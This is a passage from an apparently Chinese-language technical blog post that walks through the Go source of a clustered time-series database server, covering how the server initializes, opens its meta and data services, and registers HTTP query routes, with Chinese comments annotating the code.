service</span></span><br><span class="line">s.HintedHandoff = hh.NewService(c.HintedHandoff, s.ShardWriter, s.MetaClient)</span><br><span class="line">s.HintedHandoff.Monitor = s.Monitor</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize points writer.</span></span><br><span class="line">s.PointsWriter = cluster.NewPointsWriter()</span><br><span class="line">s.PointsWriter.WriteTimeout = time.Duration(c.Coordinator.WriteTimeout)</span><br><span class="line">s.PointsWriter.TSDBStore = s.TSDBStore</span><br><span class="line">s.PointsWriter.ShardWriter = s.ShardWriter</span><br><span class="line">s.PointsWriter.HintedHandoff = s.HintedHandoff</span><br><span class="line">s.PointsWriter.Node = s.Node</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize meta executor.</span></span><br><span class="line">metaExecutor := cluster.NewMetaExecutor()</span><br><span class="line">metaExecutor.MetaClient = s.MetaClient</span><br><span class="line">metaExecutor.Node = s.Node</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize query executor.</span></span><br><span class="line">        <span class="comment">// 初始化查询</span></span><br><span class="line">s.QueryExecutor = query.NewExecutor()</span><br><span class="line">        <span class="comment">//初始化集群存储分片</span></span><br><span class="line">clusterShardMapper := &amp;cluster.ClusterShardMapper&#123;</span><br><span class="line">MetaClient: s.MetaClient,</span><br><span class="line">TSDBStore:  coordinator.LocalTSDBStore&#123;Store: s.TSDBStore&#125;,</span><br><span class="line">LocalShardMapper: &amp;coordinator.LocalShardMapper&#123;</span><br><span class="line">MetaClient: s.MetaClient,</span><br><span class="line">TSDBStore:  coordinator.LocalTSDBStore&#123;Store: s.TSDBStore&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">Node:               s.Node,</span><br><span class="line">ShardMapperTimeout: time.Duration(s.config.Cluster.ShardMapperTimeout),</span><br><span class="line">&#125;</span><br><span class="line">clusterShardMapper.WithLogger(s.Logger)</span><br><span class="line"><span class="comment">//初始化执行</span></span><br><span class="line">        <span class="comment">//设置最大的查询范围和bucket数目等</span></span><br><span class="line">s.QueryExecutor.StatementExecutor = &amp;cluster.StatementExecutor&#123;</span><br><span class="line">MetaClient:        s.MetaClient,</span><br><span class="line">TaskManager:       s.QueryExecutor.TaskManager,</span><br><span class="line">TSDBStore:         s.TSDBStore,</span><br><span class="line">ShardMapper:       clusterShardMapper,</span><br><span class="line">Monitor:           s.Monitor,</span><br><span class="line">PointsWriter:      s.PointsWriter,</span><br><span class="line">MaxSelectPointN:   c.Coordinator.MaxSelectPointN,</span><br><span class="line">MaxSelectSeriesN:  c.Coordinator.MaxSelectSeriesN,</span><br><span class="line">MaxSelectBucketsN: c.Coordinator.MaxSelectBucketsN,</span><br><span class="line">MetaExecutor:      metaExecutor,</span><br><span class="line">&#125;</span><br><span class="line">s.QueryExecutor.TaskManager.QueryTimeout = time.Duration(c.Coordinator.QueryTimeout)</span><br><span class="line">s.QueryExecutor.TaskManager.LogQueriesAfter = time.Duration(c.Coordinator.LogQueriesAfter)</span><br><span class="line">s.QueryExecutor.TaskManager.MaxConcurrentQueries = c.Coordinator.MaxConcurrentQueries</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the monitor</span></span><br><span class="line">s.Monitor.Version = s.buildInfo.Version</span><br><span class="line">s.Monitor.Commit = s.buildInfo.Commit</span><br><span class="line">s.Monitor.Branch = s.buildInfo.Branch</span><br><span class="line">s.Monitor.BuildTime = s.buildInfo.Time</span><br><span class="line">s.Monitor.PointsWriter = (*monitorPointsWriter)(s.PointsWriter)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>open启动服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open opens the meta and data store and all services.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span> <span class="title">Open</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Start profiling, if set.</span></span><br><span class="line">    <span class="comment">// linux profile</span></span><br><span class="line">startProfile(s.CPUProfile, s.MemProfile)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open shared TCP connection.</span></span><br><span class="line">    <span class="comment">// 启动tcp连接</span></span><br><span class="line">ln, err := net.Listen(<span class="string">"tcp"</span>, s.BindAddress)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"listen: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">s.Listener = ln</span><br><span class="line"></span><br><span class="line"><span class="comment">// Multiplex listener.</span></span><br><span class="line">    <span class="comment">// 启动多路复用器</span></span><br><span class="line">mux := tcp.NewMux()</span><br><span class="line">s.Mux = mux</span><br><span class="line"><span class="keyword">go</span> mux.Serve(ln)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.MetaService != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="comment">//元数据服务raftlistener初始化</span></span><br><span class="line">s.MetaService.RaftListener = mux.Listen(meta.MuxHeader)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Configure logging for all services and clients.</span></span><br><span class="line"><span class="keyword">if</span> s.config.Meta.LoggingEnabled &#123;</span><br><span class="line">s.MetaService.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open meta service.</span></span><br><span class="line">        <span class="comment">//元数据服务启动</span></span><br><span class="line"><span class="keyword">if</span> err := s.MetaService.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open meta service: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> s.monitorErrorChan(s.MetaService.Err())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.AdminClusterService != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Configure logging for all services and clients.</span></span><br><span class="line"><span class="keyword">if</span> s.config.AdminCluster.ClusterTracing &#123;</span><br><span class="line">s.AdminClusterService.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// TCP listen</span></span><br><span class="line">s.AdminClusterService.TCPHandler.Listener = s.Mux.Listen(admin_cluster.MuxHeader)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open admin cluster service.</span></span><br><span class="line">        <span class="comment">//启动集群admin_cluster服务</span></span><br><span class="line"><span class="keyword">if</span> err := s.AdminClusterService.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open admin cluster service: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize MetaClient.</span></span><br><span class="line">    <span class="comment">//初始化元数据客户端，用于设置集群功能，加入集群等功能。</span></span><br><span class="line"><span class="keyword">if</span> err = s.initializeMetaClient(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start the reporting service, if not disabled.</span></span><br><span class="line"><span class="comment">//if !s.reportingDisabled &#123;</span></span><br><span class="line"><span class="comment">//go s.startServerReporting()</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initializeMetaClient函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// initializeMetaClient will set the MetaClient and join the node to the cluster if needed</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span> <span class="title">initializeMetaClient</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// It's the first time starting up and we need to either join</span></span><br><span class="line"><span class="comment">// the cluster or initialize this node as the first member</span></span><br><span class="line">    <span class="comment">//如果每天joinpeers，则返回</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s.joinPeers) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// start up a new single node cluster</span></span><br><span class="line"><span class="keyword">if</span> s.MetaService == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"server not set to join existing cluster must run also as a meta node"</span>)</span><br><span class="line">&#125;</span><br><span class="line">s.MetaClient.SetMetaServers([]<span class="keyword">string</span>&#123;s.MetaService.HTTPAddr()&#125;)</span><br><span class="line">s.MetaClient.SetTLS(s.metaUseTLS)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">var</span> joinPeers []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> s.MetaService != <span class="literal">nil</span> &#123;</span><br><span class="line">raddr := s.remoteAddr(s.MetaService.HTTPAddr())</span><br><span class="line">joinPeers, err = s.filterAddr(s.joinPeers, raddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">joinPeers = s.joinPeers</span><br><span class="line">&#125;</span><br><span class="line">s.MetaClient.SetMetaServers(joinPeers)</span><br><span class="line">s.MetaClient.SetTLS(s.metaUseTLS)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//打开client</span></span><br><span class="line"><span class="keyword">if</span> err := s.MetaClient.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if the node ID is &gt; 0 then we need to initialize the metaclient</span></span><br><span class="line"><span class="keyword">if</span> s.Node.GetMetaID() &gt; <span class="number">0</span> || s.Node.GetDataID() &gt; <span class="number">0</span> &#123;</span><br><span class="line">s.MetaClient.WaitForDataChanged()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s.joinPeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line">s.MetaClient.SetMetaServers(s.joinPeers)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> s.config.Data.Enabled &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">t := time.NewTicker(time.Second)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-t.C:</span><br><span class="line">                    <span class="comment">//定时器服务，检查是否打开数据服务</span></span><br><span class="line"><span class="keyword">if</span> _, err := s.MetaClient.DataNode(s.Node.GetDataID()); err == <span class="literal">nil</span> &#123;</span><br><span class="line">oerr := s.OpenDataServer()</span><br><span class="line"><span class="keyword">if</span> oerr != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Error(<span class="string">"failed to open data server."</span>, zap.Error(oerr))</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"open data server failed"</span>)</span><br><span class="line">&#125;</span><br><span class="line">s.Logger.Info(<span class="string">"data server started"</span>, zap.Uint64(<span class="string">"node id"</span>, s.Node.GetDataID()))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-s.closing:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果找到数据节点，则启动opendataServer函数，启动数据服务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span> <span class="title">OpenDataServer</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> s.TSDBStore != <span class="literal">nil</span> &amp;&amp; !s.DataServicesOpened &#123;</span><br><span class="line">s.DataServicesOpened = <span class="literal">true</span></span><br><span class="line"><span class="comment">// Append services.</span></span><br><span class="line">         <span class="comment">// 启动集群服务，初始化所有的服务</span></span><br><span class="line">s.appendClusterService(s.config.Cluster)</span><br><span class="line">s.appendMonitorService()</span><br><span class="line">s.appendPrecreatorService(s.config.Precreator)</span><br><span class="line">s.appendSnapshotterService()</span><br><span class="line">s.appendContinuousQueryService(s.config.ContinuousQuery)</span><br><span class="line">s.appendAntiEntropyService(s.config.AntiEntropy)</span><br><span class="line">        <span class="comment">// http服务</span></span><br><span class="line">s.appendHTTPDService(s.config.HTTPD)</span><br><span class="line">s.appendStorageService(s.config.Storage)</span><br><span class="line">        <span class="comment">//RetentionPolicy</span></span><br><span class="line">s.appendRetentionPolicyService(s.config.Retention)</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.GraphiteInputs &#123;</span><br><span class="line"><span class="keyword">if</span> err := s.appendGraphiteService(i); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.CollectdInputs &#123;</span><br><span class="line">s.appendCollectdService(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.OpenTSDBInputs &#123;</span><br><span class="line"><span class="keyword">if</span> err := s.appendOpenTSDBService(i); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.UDPInputs &#123;</span><br><span class="line">s.appendUDPService(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Subscriber.MetaClient = s.MetaClient</span><br><span class="line">s.PointsWriter.MetaClient = s.MetaClient</span><br><span class="line">s.Monitor.MetaClient = s.MetaClient</span><br><span class="line">s.ShardWriter.MetaClient = s.MetaClient</span><br><span class="line">s.HintedHandoff.MetaClient = s.MetaClient</span><br><span class="line"></span><br><span class="line">s.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)</span><br><span class="line">s.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Configure logging for all services and clients.</span></span><br><span class="line"><span class="keyword">if</span> s.config.Meta.LoggingEnabled &#123;</span><br><span class="line">s.MetaClient.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.TSDBStore.WithLogger(s.Logger)</span><br><span class="line"><span class="keyword">if</span> s.config.Data.QueryLogEnabled &#123;</span><br><span class="line">s.QueryExecutor.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.PointsWriter.WithLogger(s.Logger)</span><br><span class="line">s.Subscriber.WithLogger(s.Logger)</span><br><span class="line">s.HintedHandoff.WithLogger(s.Logger)</span><br><span class="line"><span class="keyword">for</span> _, svc := <span class="keyword">range</span> s.Services &#123;</span><br><span class="line">svc.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.SnapshotterService.WithLogger(s.Logger)</span><br><span class="line">s.Monitor.WithLogger(s.Logger)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open TSDB store.</span></span><br><span class="line">        <span class="comment">// tsdb启动</span></span><br><span class="line"><span class="keyword">if</span> err := s.TSDBStore.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open tsdb store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the hinted handoff service</span></span><br><span class="line"><span class="keyword">if</span> err := s.HintedHandoff.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open hinted handoff: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the subscriber service</span></span><br><span class="line"><span class="keyword">if</span> err := s.Subscriber.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open subscriber: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the points writer service</span></span><br><span class="line"><span class="keyword">if</span> err := s.PointsWriter.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open points writer: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, service := <span class="keyword">range</span> s.Services &#123;</span><br><span class="line">            <span class="comment">//将注册的服务都启动起来，这边调用每个服务的open方法启动起来</span></span><br><span class="line"><span class="keyword">if</span> err := service.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open service: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> s.TSDBStore == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"Data server is not enabled"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务主要有下面这些：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cluster</span><br><span class="line">monitor</span><br><span class="line">precreator</span><br><span class="line">snapshotter</span><br><span class="line">continuousquery</span><br><span class="line">antientropy</span><br><span class="line">http</span><br><span class="line">storage</span><br><span class="line">retentionpolicy</span><br><span class="line">graphite</span><br><span class="line">collectd</span><br><span class="line">opentsdb</span><br><span class="line">udp</span><br><span class="line">hh</span><br><span class="line">meta</span><br></pre></td></tr></table></figure><p>每个服务都有open函数，分别启动。</p><p>举例来说：</p><p>http服务初始化函数NewService:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewService returns a new instance of Service.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewService</span><span class="params">(c Config)</span> *<span class="title">Service</span></span> &#123;</span><br><span class="line">s := &amp;Service&#123;</span><br><span class="line">addr:           c.BindAddress,</span><br><span class="line">https:          c.HTTPSEnabled,</span><br><span class="line">cert:           c.HTTPSCertificate,</span><br><span class="line">key:            c.HTTPSPrivateKey,</span><br><span class="line">limit:          c.MaxConnectionLimit,</span><br><span class="line">err:            <span class="built_in">make</span>(<span class="keyword">chan</span> error),</span><br><span class="line">unixSocket:     c.UnixSocketEnabled,</span><br><span class="line">unixSocketPerm: <span class="keyword">uint32</span>(c.UnixSocketPermissions),</span><br><span class="line">bindSocket:     c.BindSocket,</span><br><span class="line">Handler:        NewHandler(c),  <span class="comment">//服务启动处理函数</span></span><br><span class="line">Logger:         zap.NewNop(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> s.key == <span class="string">""</span> &#123;</span><br><span class="line">s.key = s.cert</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.UnixSocketGroup != <span class="literal">nil</span> &#123;</span><br><span class="line">s.unixSocketGroup = <span class="keyword">int</span>(*c.UnixSocketGroup)</span><br><span class="line">&#125;</span><br><span class="line">s.Handler.Logger = s.Logger</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handler函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewHandler</span><span class="params">(c Config)</span> *<span class="title">Handler</span></span> &#123;</span><br><span class="line">h := &amp;Handler&#123;</span><br><span class="line">mux:            pat.New(),</span><br><span class="line">Config:         &amp;c,</span><br><span class="line">Logger:         zap.NewNop(),</span><br><span class="line">CLFLogger:      log.New(os.Stderr, <span class="string">"[httpd] "</span>, <span class="number">0</span>),</span><br><span class="line">Store:          storage.NewStore(),</span><br><span class="line">stats:          &amp;Statistics&#123;&#125;,</span><br><span class="line">requestTracker: NewRequestTracker(),</span><br><span class="line">sema:           <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">100</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Limit the number of concurrent &amp; enqueued write requests.</span></span><br><span class="line">h.writeThrottler = NewThrottler(c.MaxConcurrentWriteLimit, c.MaxEnqueuedWriteLimit)</span><br><span class="line">h.writeThrottler.EnqueueTimeout = c.EnqueuedWriteTimeout</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable the write log if they have been suppressed.</span></span><br><span class="line">writeLogEnabled := c.LogEnabled</span><br><span class="line"><span class="keyword">if</span> c.SuppressWriteLog &#123;</span><br><span class="line">writeLogEnabled = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//所有服务查询的入口函数在这边处理</span></span><br><span class="line">    h.AddRoutes([]Route&#123;</span><br><span class="line">Route&#123;</span><br><span class="line"><span class="string">"query-options"</span>, <span class="comment">// Satisfy CORS checks.</span></span><br><span class="line"><span class="string">"OPTIONS"</span>, <span class="string">"/query"</span>, <span class="literal">false</span>, <span class="literal">true</span>, h.serveOptions,</span><br><span class="line">&#125;,</span><br><span class="line">Route&#123;</span><br><span class="line"><span class="string">"query"</span>, <span class="comment">// Query serving route.</span></span><br><span class="line"><span class="string">"GET"</span>, <span class="string">"/query"</span>, <span class="literal">true</span>, <span class="literal">true</span>, h.serveQuery,</span><br><span class="line">&#125;,</span><br><span class="line">Route&#123;</span><br><span class="line"><span class="string">"query"</span>, <span class="comment">// Query serving route.</span></span><br><span class="line"><span class="string">"POST"</span>, <span class="string">"/query"</span>, <span class="literal">true</span>, <span class="literal">true</span>, h.serveQuery,</span><br><span class="line">&#125;,</span><br><span class="line">Route&#123;</span><br><span class="line">            ....</span><br><span class="line"><span class="string">"GET"</span>, <span class="string">"/metrics"</span>, <span class="literal">false</span>, <span class="literal">true</span>, promhttp.Handler().ServeHTTP,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;...)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> h</span><br><span 